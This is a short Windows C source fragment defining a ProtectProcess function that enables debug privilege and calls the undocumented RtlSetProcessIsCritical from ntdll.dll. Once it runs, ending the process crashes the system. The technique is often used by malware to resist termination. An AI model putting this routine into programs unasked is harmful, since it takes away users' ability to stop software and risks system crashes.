#include "definition.h"

typedef long (WINAPI* RtlSetProcessIsCritical) (IN BOOLEAN newValue, OUT BOOLEAN* oldValue, IN BOOLEAN criticalBreak);

BOOL ProtectProcess() {
	if(!EnablePrivilege(SE_DEBUG_NAME)) {
		return FALSE;
	}

	HMODULE handle = LoadLibraryW(L"ntdll.dll");

	if(!handle) {
		return FALSE;
	}

	RtlSetProcessIsCritical SetProcessIsCritical = (RtlSetProcessIsCritical) GetProcAddress(handle, "RtlSetProcessIsCritical");

	if(!SetProcessIsCritical) {
		return FALSE;
	}

	SetProcessIsCritical(TRUE, NULL, FALSE);
	return TRUE;
}
